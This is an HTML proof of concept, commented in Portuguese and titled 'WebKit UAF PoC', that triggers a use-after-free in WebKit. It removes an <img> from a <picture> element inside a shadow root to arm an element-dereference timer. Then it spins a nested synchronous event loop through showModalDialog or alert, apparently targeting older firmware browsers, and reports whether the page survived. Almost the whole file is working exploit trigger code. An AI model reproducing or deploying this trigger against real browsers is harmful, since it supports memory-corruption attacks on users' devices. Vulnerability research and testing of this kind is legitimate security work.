<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>WebKit UAF PoC</title>
</head>
<body>
    <div id="host" style="display:none"></div>
    <div id="status">Executando teste...</div>

    <script>
    var host = document.getElementById('host');
    var sr = host.attachShadow ? host.attachShadow({mode: 'open'}) : host.createShadowRoot();

    // Cria a estrutura <picture> com imagem inline em base64
    sr.innerHTML = '<picture id="pic"><source srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><img></picture>';
    var pic = sr.getElementById('pic');

    pic.addEventListener('load', function listener() {
        pic.removeEventListener('load', listener, true);

        // 1. Remove a <img> de <picture> para armar o m_derefElementTimer
        pic.textContent = '';

        // 2. Cria o nested event loop síncrono
        if (typeof window.showModalDialog === 'function') {
            // Se showModalDialog estiver exposto (firmwares mais antigos)
            window.showModalDialog('05.html');
        } else {
            // Fallback para prompts modais síncronos no WebKit legado
            alert('Aguardando loop aninhado...');
        }

        // 3. Verifica sobrevivência após o retorno da stack
        setTimeout(function() {
            document.getElementById('status').innerText = 'Sobreviveu (sem crash)';
        }, 0);

    }, true /* capture */);
    </script>
</body>
</html>
